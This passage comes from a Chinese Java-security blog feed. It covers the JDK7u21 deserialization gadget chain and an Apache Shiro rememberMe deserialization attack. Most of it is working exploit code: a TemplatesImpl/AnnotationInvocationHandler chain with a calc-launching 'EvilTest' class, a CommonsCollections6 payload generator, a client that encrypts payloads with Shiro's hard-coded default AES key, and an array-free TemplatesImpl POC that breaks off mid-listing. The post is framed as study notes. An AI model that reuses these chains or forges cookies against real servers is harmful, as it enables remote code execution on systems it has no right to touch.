class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public class JDK7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;  </span><br><span class="line">            ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()  </span><br><span class="line">        &#125;);  </span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;Ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;String, Object&gt; memberValue = new HashMap&lt;String, Object&gt;();  </span><br><span class="line">        memberValue.put(&quot;f5a5a608&quot;,&quot;Ku1s&quot;);  </span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //得到构造器  </span><br><span class="line">        constructor.setAccessible(true);  </span><br><span class="line">        InvocationHandler  handler = (InvocationHandler) constructor.newInstance(Templates.class, memberValue); //实例化  </span><br><span class="line">  </span><br><span class="line">        //然后就是生成动态代理  </span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashSet hashSet = new LinkedHashSet();  </span><br><span class="line">        hashSet.add(templates);  </span><br><span class="line">        hashSet.add(proxy);  </span><br><span class="line">  </span><br><span class="line">        memberValue.put(&quot;f5a5a608&quot;,templates);  </span><br><span class="line">        byte[] bytes = serialize(hashSet);  </span><br><span class="line">        unserialize(bytes);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EvilTest.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class EvilTest extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public EvilTest() throws Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>有点杂乱，但通过这次学习明白了许多知识点，还会继续学习，后面会分析 8u20，7u21在 7u25中修复了，但还是会有安全问题。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《JAVA安全漫谈》</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-Shiro反序列化详解</title>
      <link href="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>参考 ：<a href="https://blog.csdn.net/m0_67401270/article/details/126721347">Shiro环境搭建</a></p><h1 id="前景回顾"><a href="#前景回顾" class="headerlink" title="前景回顾"></a>前景回顾</h1><p>shiro爆出了一个默认key的反序列化漏洞。至今已有大量的分析文章分析了该漏洞的原理，所以本文不再重复分析该漏洞的相关原理，可以参考以下几篇文章的分析：</p><ul><li><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></li><li><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li></ul><p>也可以参考我在CSDN 中写过的文章:<br><a href="https://blog.csdn.net/snowlyzz/article/details/128192360?spm=1001.2014.3001.5501">[Java反序列化]—Shiro反序列化(二)_反序列化cc链_snowlyzz的博客-CSDN博客</a><br>原因可能是当时写的不够详细，也不够深入，至此，本站的博客都 会打造一个 详细深入的学习</p><p>进入正题：</p><p>如果登录时选择了remember me的多选框，则登录成功后服务端会返回一个rememberMe的Cookie：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/1.jpg"></p><p>对此，我们攻击过程如下： </p><ol><li>使用以前学过的CommonsCollections利用链生成一个序列化Payload </li><li>使用Shiro默认Key进行加密 </li><li>将密文作为rememberMe的Cookie发送给服务端：</li></ol><p>这里结合CC6  编写成一个CLASS进行触发链子：</p><p>CC6.CLASS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollections6 &#123;</span><br><span class="line">    public byte[] getPayload(String command) throws Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                        new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,</span><br><span class="line">                        new String[] &#123; command &#125;),</span><br><span class="line">                new ConstantTransformer(1),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Map expMap = new HashMap();</span><br><span class="line">        expMap.put(tme, &quot;valuevalue&quot;);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(&quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        return barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String []args) throws Exception &#123;  </span><br><span class="line">        byte[] payloads = new CommonsCollections6().getPayload(&quot;calc.exe&quot;);  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的是将 参数传入CC6 ，再将payload 进行 aes 加密，传入 Shiro 客户端中会发现结果没有像预想那样 弹出计算器，这是为什么？</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/x.jpg"></p><p>我们从报错信息 从下往上看， 看到倒数第一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)</span><br></pre></td></tr></table></figure><p>可以看到这是一个 ObjectInputStream 的一个内置类，重写了其 resolveClass 方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class ClassResolvingObjectInputStream extends ObjectInputStream &#123;  </span><br><span class="line">  </span><br><span class="line">    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException &#123;  </span><br><span class="line">        super(inputStream);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /**  </span><br><span class="line">     * Resolves an &#123;@link ObjectStreamClass&#125; by delegating to Shiro&#x27;s   </span><br><span class="line">     * &#123;@link ClassUtils#forName(String)&#125; utility method, which is known to work in all ClassLoader environments.  </span><br><span class="line">     ** @param osc the ObjectStreamClass to resolve the class name.  </span><br><span class="line">     * @return the discovered class  </span><br><span class="line">     * @throws IOException never - declaration retained for subclass consistency  </span><br><span class="line">     * @throws ClassNotFoundException if the class could not be found in any known ClassLoader  </span><br><span class="line">     */    @Override  </span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            return ClassUtils.forName(osc.getName());  </span><br><span class="line">        &#125; catch (UnknownClassException e) &#123;  </span><br><span class="line">            throw new ClassNotFoundException(&quot;Unable to load ObjectStreamClass [&quot; + osc + &quot;]: &quot;, e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```txt</span><br><span class="line">**resolveClass这个方法是Java原生反序列的时候必定会调用的，这里重写了就不会调用Java内置的resolveClass了**</span><br></pre></td></tr></table></figure><p>resolveClass 是反序列化用来查找类的一个方法，在读取序列化流的时候，督导一个字符串形式的类名，需要通过这个方法来找到对应的 Java.lang.CLass对象</p><p>对比一下其父类的 resolveClass，也就是 ObjectInputStream 中的  方法 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc)  </span><br><span class="line">    throws IOException, ClassNotFoundException  </span><br><span class="line">&#123;  </span><br><span class="line">    String name = desc.getName();  </span><br><span class="line">    try &#123;  </span><br><span class="line">        return Class.forName(name, false, latestUserDefinedLoader());  </span><br><span class="line">    &#125; catch (ClassNotFoundException ex) &#123;  </span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);  </span><br><span class="line">        if (cl != null) &#123;  </span><br><span class="line">            return cl;  </span><br><span class="line">        &#125; else &#123;  </span><br><span class="line">            throw ex;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>区别就是 前者用的是 org.apache.shiro.util.ClassUtils#forName , 先跟进这个forName ClassUtils#看一眼  这里首先使用了THREAD_CL_ACCESSOR.loadClass类加载器，这里手动F9就会发现fqcn变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;[Lorg.apache.commons.collections.Transformer;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/3.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[L是一个JVM的标记，说明实际上这是一个数组，即Transformer[]</span><br></pre></td></tr></table></figure><p>那么我们在异常捕捉的位置下个断点，看看是哪个类触发了异常：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/5.jpg"></p><p>可见，出异常时加载的类名为&#96;&#96;&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Lorg.apache.commons.collections.Transformer; 。这个类名看起来 怪，其实就是表示 org.apache.commons.collections.Transformer 的数组。</span><br></pre></td></tr></table></figure><p>看了网上文章的解释是 ：</p><ol><li>数组形式会使得shiro想尝试从本地加载时，path也被赋上数组标识，导致无法从本地jar包中正常获取。</li><li>Class.forName 支持加载数组，而 ClassLoader.loadClass 不支持 加载数组，这个区别导致了问题。</li></ol><p>这里仅给出最后的结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p><h1 id="构造不含数组的反序列化链"><a href="#构造不含数组的反序列化链" class="headerlink" title="构造不含数组的反序列化链"></a>构造不含数组的反序列化链</h1><p>我们的链子 要满足没有数组的情况，也就是不能用 ChainedTransformer#transform</p><p>参考 安全漫谈和此文<br><a href="https://www.anquanke.com/post/id/192619">Java反序列化利用链分析之Shiro反序列化-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>我们可以用到 TemplatesImpl 也就是我们的CC3 来进行拼接，我们可以通过以下几行代码来执行一段JAVA 的字节码 ~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">    TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">    setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">    setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">    setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 我们又可以 使用 InvokeTransformer 去反射调用 TemplatesImpl#newTransformer方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123; </span><br><span class="line">new ConstantTransformer(obj), </span><br><span class="line">new InvokerTransformer(&quot;newTransformer&quot;, null, null) &#125;;</span><br></pre></td></tr></table></figure><p>不过这里任然是 数组，那么如何 过程中的 Transformer数组呢？</p><p>在CC6中 用到了一个类   TiedMapEntry ，其构造方法中接收两个参数，一个是Map  ，第二个是Key</p><p>TiedMapEntry 有个 getValue 方法，调用了 map 的get 方法，并且传入了 key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123; </span><br><span class="line">return map.get(key); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这个map是LazyMap时，其get方法就是触发transform的关键点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;  </span><br><span class="line">    // create value for key if key is not currently in the map  </span><br><span class="line">    if (map.containsKey(key) == false) &#123;  </span><br><span class="line">        Object value = factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        return value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    return map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 LazyMap#get 方法的参数key是不关心的，因为 通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化 恶意对象。</p><p>但是 此时我们无法使用Transformer 数组了，也就不能再使用 ConstantTransformer。</p><p>我们将注意力关注在  InvokerTransformer.transform上</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/tr.png"></p><p>这里是最经典的反射写法，根据传入的 input对象，调用其 iMethodName(可控) 那么如果这里传入的是我们构造好的 TemplatesImpl 对象呢，他是否可以调用 newtransform加载字节码</p><p>很明显，这样我们就可以通过将<code>iMethodName</code>置为<code>newTransformer</code>，从而完成后续的templates gadgets。</p><p>这里将 构造好的TemplatesImpl 对象 (key) 作为 InvokerTransformer.transform的函数的input传入，我们就可以将链子串联起来了</p><h1 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h1><p>首先还是 创建利用点  TemplatesImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>然后我们创建一个用来调用newTransformer方法的InvokerTransformer，但注意的是，此时先传入一 个人畜无害的方法，比如 getClass ，避免恶意方法在构造Gadget的时候触发：</p><p><code>Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);</code></p><p>再把 CC6的代码复制过来 然后改上一节说到的点，就是将原来TiedMapEntry 构造时的第二个参数key，改为前面创建的 TemplatesImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HashMap innermap = new HashMap();  </span><br><span class="line">//outMap = LazyMap.class  </span><br><span class="line">Map outmap = LazyMap.decorate(innermap, transformer); </span><br><span class="line">//此时 factory=InvokerTransformer.transform(key)  此时要调用get传key进去  </span><br><span class="line">  </span><br><span class="line">//接上LazyMap 调用get 传key 步骤：  </span><br><span class="line">TiedMapEntry tme = new TiedMapEntry(outmap, obj);  </span><br><span class="line">  </span><br><span class="line">Map expMap = new HashMap();  </span><br><span class="line">expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">outmap.clear();</span><br></pre></td></tr></table></figure><p>这里使用 outerMap.remove(“keykey”); 来移 除key的副作用，现在是通过 outerMap.clear(); ，效果相同。 </p><h2 id="调用顺序"><a href="#调用顺序" class="headerlink" title="调用顺序"></a>调用顺序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap.put()</span><br><span class="line">=&gt;java.util.HashMap.hash()</span><br><span class="line">=&gt;org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TiedMapEntry#hashCode()</span><br><span class="line">=&gt;TiedMapEntry#getValue(key=Transform恶意类)</span><br><span class="line"></span><br><span class="line">LazyMap#get()</span><br><span class="line">=&gt; LazyMap.decorate(Map=innerMap, factory=InvokerTransformer)</span><br><span class="line">=&gt; get() -&gt; InvokerTransformer.transform(Transform恶意类)</span><br><span class="line"></span><br><span class="line">InvokerTransformer#transform()</span><br><span class="line">input = Transform恶意类</span><br><span class="line">iMethodName = newTransformer (可控)</span><br><span class="line">iParamTypes = code (可控)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后，将 InvokerTransformer 的方法从人畜无害的 getClass ，改成 newTransformer ，正式完成武 器装配。</p><p>完整POC：</p><p>CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line">import org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">import java.io.ByteArrayOutputStream;  </span><br><span class="line">import java.io.ObjectOutputStream;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class CommonsCollectionsShiro &#123;  </span><br><span class="line">        public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;  </span><br><span class="line">            //TemplatesImpl恶意类  </span><br><span class="line">            TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);  </span><br><span class="line">            setFieldValue(obj, &quot;_name&quot;, 